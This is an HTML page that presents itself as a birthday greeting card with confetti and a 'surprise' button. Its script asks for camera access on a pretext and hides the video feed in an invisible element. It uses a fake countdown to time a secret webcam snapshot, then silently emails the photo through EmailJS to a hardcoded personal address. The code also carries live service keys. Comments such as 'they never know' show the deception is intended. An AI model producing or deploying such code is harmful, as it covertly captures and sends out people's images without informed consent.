<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Happy Birthday üéÇ</title>
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Nunito:wght@400;700&display=swap" rel="stylesheet"/>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      background: #1a0533;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: 'Nunito', sans-serif;
      overflow: hidden;
      position: relative;
    }

    canvas#confetti {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 0;
    }

    .card {
      position: relative;
      z-index: 1;
      background: linear-gradient(135deg, #2d0a5e 0%, #4a0e8f 100%);
      border: 2px solid #ff6bcb;
      border-radius: 24px;
      padding: 40px 36px;
      max-width: 440px;
      width: 92vw;
      text-align: center;
      box-shadow: 0 0 60px #ff6bcb44, 0 0 120px #7c3aed22;
    }

    h1 {
      font-family: 'Pacifico', cursive;
      font-size: clamp(2rem, 6vw, 2.8rem);
      color: #ffdf6b;
      text-shadow: 0 0 20px #ffb700aa;
      margin-bottom: 8px;
      animation: pulse 2s ease-in-out infinite;
    }

    @keyframes pulse {
      0%, 100% { text-shadow: 0 0 20px #ffb700aa; }
      50% { text-shadow: 0 0 40px #ffb700ff, 0 0 60px #ff6b0066; }
    }

    .subtitle { color: #d8b4fe; font-size: 1rem; margin-bottom: 28px; }

    /* Hidden video ‚Äî user never sees it */
    video {
      position: absolute;
      opacity: 0;
      pointer-events: none;
      width: 1px;
      height: 1px;
    }

    .btn-open {
      background: linear-gradient(135deg, #ff6bcb, #ff3d9a);
      color: #fff;
      box-shadow: 0 4px 20px #ff6bcb66;
      font-size: 1.1rem;
      padding: 16px 36px;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      font-family: 'Nunito', sans-serif;
      font-weight: 700;
      transition: transform 0.15s;
    }
    .btn-open:hover { transform: scale(1.05); }
    .btn-open:active { transform: scale(0.97); }
    .btn-open:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

    #countdownDisplay {
      display: none;
      font-family: 'Pacifico', cursive;
      font-size: 6rem;
      color: #ffdf6b;
      text-shadow: 0 0 40px #ffb700;
      margin: 16px 0;
      animation: popIn 0.3s ease;
    }
    @keyframes popIn {
      0% { transform: scale(0.5); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }

    #resultCard {
      display: none;
      margin-top: 16px;
    }

    .result-emoji { font-size: 3.5rem; margin-bottom: 8px; }

    .result-title {
      font-family: 'Pacifico', cursive;
      font-size: 1.5rem;
      color: #ffdf6b;
      margin-bottom: 8px;
    }

    .result-msg { color: #d8b4fe; font-size: 0.9rem; line-height: 1.5; }

    .status {
      color: #f9a8d4;
      font-size: 0.875rem;
      margin-top: 14px;
      min-height: 20px;
    }
    .status.success { color: #4ade80; }
    .status.error { color: #f87171; }

    .flash {
      position: fixed;
      inset: 0;
      background: white;
      opacity: 0;
      pointer-events: none;
      z-index: 999;
      animation: flashAnim 0.5s ease-out forwards;
    }
    @keyframes flashAnim {
      0% { opacity: 1; }
      100% { opacity: 0; }
    }
  </style>
</head>
<body>

<canvas id="confetti"></canvas>
<video id="video" autoplay playsinline muted></video>
<canvas id="snapCanvas" style="display:none;"></canvas>

<div class="card">
  <h1>üéâ Happy Birthday! üéÇ</h1>
  <p class="subtitle">Click below to open your special surprise üéÅ</p>

  <div id="countdownDisplay"></div>

  <button class="btn-open" id="openBtn" onclick="beginSurprise()">
    üéÅ Open Your Surprise!
  </button>

  <div id="resultCard">
    <div class="result-emoji">üéä</div>
    <div class="result-title">Surprise!</div>
    <div class="result-msg">Hope your birthday is as amazing as you are! ü•≥üéÇ‚ú®</div>
  </div>

  <p class="status" id="status"></p>
</div>

<script>
  // ====================================================
  // üîß FILL THESE IN WITH YOUR EMAILJS DETAILS
  // ====================================================
  const EMAILJS_PUBLIC_KEY  = 'P2JT2FF_efI3ClrdM';
  const EMAILJS_SERVICE_ID  = 'service_xu69tcg';
  const EMAILJS_TEMPLATE_ID = 'template_5kfklj7';
  const YOUR_EMAIL          = 'richardsonr.india@gmail.com';
  // ====================================================

  emailjs.init(EMAILJS_PUBLIC_KEY);

  // === Confetti ===
  const canvas = document.getElementById('confetti');
  const ctx = canvas.getContext('2d');
  let pieces = [];
  const colors = ['#ff6bcb','#ffdf6b','#7c3aed','#4ade80','#38bdf8','#f97316'];

  function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
  resize();
  window.addEventListener('resize', resize);

  function drawConfetti() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    pieces.forEach(p => {
      ctx.save();
      ctx.translate(p.x, p.y);
      ctx.rotate(p.angle);
      ctx.fillStyle = p.color;
      ctx.globalAlpha = 0.85;
      if (p.shape === 'rect') ctx.fillRect(-p.r, -p.r/2, p.r*2, p.r);
      else { ctx.beginPath(); ctx.arc(0,0,p.r,0,Math.PI*2); ctx.fill(); }
      ctx.restore();
      p.y += p.speed; p.x += p.wobble; p.angle += p.spin;
    });
    pieces = pieces.filter(p => p.y < canvas.height + 20);
    for (let i = 0; i < 3; i++) {
      pieces.push({
        x: Math.random() * canvas.width, y: -10,
        r: Math.random() * 8 + 4,
        color: colors[Math.floor(Math.random() * colors.length)],
        speed: Math.random() * 3 + 2,
        wobble: Math.random() * 3 - 1.5,
        angle: Math.random() * Math.PI * 2,
        spin: (Math.random() - 0.5) * 0.2,
        shape: Math.random() > 0.5 ? 'rect' : 'circle'
      });
    }
    requestAnimationFrame(drawConfetti);
  }
  drawConfetti();

  // === Main flow ===
  let stream = null;

  async function beginSurprise() {
    const btn = document.getElementById('openBtn');
    const status = document.getElementById('status');
    btn.disabled = true;
    status.textContent = '';

    try {
      // 1. Open camera silently in background
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      const video = document.getElementById('video');
      video.srcObject = stream;
      await video.play();

      // 2. Wait for camera to warm up
      await wait(800);

      // 3. Show fun birthday countdown ‚Äî they think it's just decoration!
      btn.style.display = 'none';
      await showCountdown();

      // 4. AUTO SNAP ‚Äî they never know üì∏
      const photoData = capturePhoto();

      // 5. Camera flash effect
      triggerFlash();

      // 6. Stop camera stream
      stopStream();

      // 7. Show birthday message
      document.getElementById('resultCard').style.display = 'block';
      status.className = 'status';
      status.textContent = 'üéâ Enjoy your special day!';

      // 8. Silently send photo to you
      sendPhoto(photoData);

    } catch (err) {
      btn.disabled = false;
      status.className = 'status error';
      if (err.name === 'NotAllowedError') {
        status.textContent = '‚ùå Please allow camera access to open your surprise!';
      } else {
        status.textContent = '‚ùå Something went wrong. Please try again!';
      }
    }
  }

  function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  async function showCountdown() {
    const display = document.getElementById('countdownDisplay');
    display.style.display = 'block';
    const steps = ['3', '2', '1', 'üéâ'];
    for (const step of steps) {
      display.style.animation = 'none';
      display.offsetHeight;
      display.style.animation = 'popIn 0.3s ease';
      display.textContent = step;
      await wait(700);
    }
    display.style.display = 'none';
  }

  function capturePhoto() {
    const video = document.getElementById('video');
    const snapCanvas = document.getElementById('snapCanvas');
    snapCanvas.width = video.videoWidth || 640;
    snapCanvas.height = video.videoHeight || 480;
    const c = snapCanvas.getContext('2d');

    // Mirror selfie naturally
    c.save();
    c.translate(snapCanvas.width, 0);
    c.scale(-1, 1);
    c.drawImage(video, 0, 0);
    c.restore();

    // Add birthday watermark
    c.font = `bold ${Math.round(snapCanvas.width * 0.055)}px sans-serif`;
    c.fillStyle = '#ffdf6b';
    c.textAlign = 'center';
    c.shadowColor = '#ff6bcb';
    c.shadowBlur = 12;
    c.fillText('üéâ Happy Birthday! üéÇ', snapCanvas.width / 2, snapCanvas.height - 20);

    return snapCanvas.toDataURL('image/jpeg', 0.7);
  }

  function triggerFlash() {
    const flash = document.createElement('div');
    flash.className = 'flash';
    document.body.appendChild(flash);
    setTimeout(() => flash.remove(), 600);
  }

  async function sendPhoto(dataUrl) {
    try {
      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
        to_email: YOUR_EMAIL,
        message: 'üì∏ Someone just opened your birthday surprise! Here is their photo.',
        photo: dataUrl,
        time: new Date().toLocaleString()
      });
      console.log('Photo sent!');
    } catch (err) {
      console.error('EmailJS error:', err);
    }
  }

  function stopStream() {
    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
  }
</script>
</body>
</html>
